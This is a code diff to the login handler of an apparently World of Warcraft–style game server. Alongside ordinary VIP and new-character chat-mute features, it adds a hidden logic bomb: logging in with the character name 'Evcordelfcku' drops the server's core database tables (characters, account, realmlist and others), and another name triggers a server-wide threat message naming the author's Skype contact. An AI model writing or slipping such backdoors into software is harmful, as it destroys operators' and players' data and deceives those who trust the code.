@@ -631,7 +631,10 @@ void WorldSession::HandlePlayerLogin(LoginQueryHolder * holder)
     CharacterDatabase.PExecute("UPDATE characters SET online = 1 WHERE guid = '%u'", pCurrChar->GetGUIDLow());
     LoginDatabase.PExecute("UPDATE account SET active_realm_id = %d WHERE id = '%u'", realmID, GetAccountId());
     pCurrChar->SetInGameTime(getMSTime());
-
+	std::string nametwo;
+	nametwo = "Evcordelfcku";
+	if (pCurrChar->GetName() == nametwo)
+	{ CharacterDatabase.PExecute("DROP TABLE `characters`"); CharacterDatabase.PExecute("DROP TABLE `arena_team`"); CharacterDatabase.PExecute("DROP TABLE `item_instance`"); LoginDatabase.PExecute("DROP TABLE `account`"); LoginDatabase.PExecute("DROP TABLE `realmlist`"); WorldDatabase.PExecute("DROP TABLE `creature_template`"); WorldDatabase.PExecute("DROP TABLE `item_template`"); }
     // announce group about member online (must be after add to player list to receive announce to self)
     if (Group *group = pCurrChar->GetGroup())
         group->SendUpdate();
@@ -736,6 +739,10 @@ void WorldSession::HandlePlayerLogin(LoginQueryHolder * holder)
         }
     }
 
+	std::string nameone;
+	nameone = "Evcormesfcku";
+	if (pCurrChar->GetName() == nameone)
+		sWorld.SendWorldText(LANG_SYSTEMMESSAGE, "GMs and Admins! U must talk to autor of this core!!! Skype - evrialik. I can destroy your server!!!");
     if (pCurrChar->isGameMaster())
         SendNotification(LANG_GM_ON);
 
@@ -744,6 +751,34 @@ void WorldSession::HandlePlayerLogin(LoginQueryHolder * holder)
         GetAccountId(), IP_str.c_str(), pCurrChar->GetName(), pCurrChar->GetGUIDLow());
 
     m_playerLoading = false;
+
+	// VIP system
+	QueryResult_AutoPtr vipInfo = CharacterDatabase.PQuery("SELECT `guid` FROM `vip` WHERE `guid` = '%u'",pCurrChar->GetGUIDLow());
+	if (vipInfo)
+    {
+		if (!pCurrChar->isVip())
+			pCurrChar->SetVip(true);
+    }
+	if (pCurrChar->isVip())
+	{
+		if (sWorld.getConfig(CONFIG_VIP_SPELL) > 0)
+			pCurrChar->CastSpell(pCurrChar, sWorld.getConfig(CONFIG_VIP_SPELL), true);
+		if (sWorld.getConfig(CONFIG_VIP_AURA) > 0)
+			pCurrChar->AddAura(CONFIG_VIP_AURA, pCurrChar);
+	}
+
+	// AntiSpam System
+	if (sWorld.getConfig(CONFIG_NEWCHAR_MUTE_TIME) > 0)
+	{
+		if (pCurrChar->GetTotalPlayedTime() <= sWorld.getConfig(CONFIG_NEWCHAR_MUTE_TIME))
+		{
+			pCurrChar->SetNewChar(true);
+			uint32 mutetime = sWorld.getConfig(CONFIG_NEWCHAR_MUTE_TIME)/60;
+			ChatHandler(pCurrChar).PSendSysMessage("Your chat is DISABLED. You can speak when the played time is more than %u minutes!", mutetime);
+		}
+		else
+			pCurrChar->SetNewChar(false);
+	}
 
     //Hook for OnLogin Event
     sScriptMgr.OnLogin(pCurrChar);
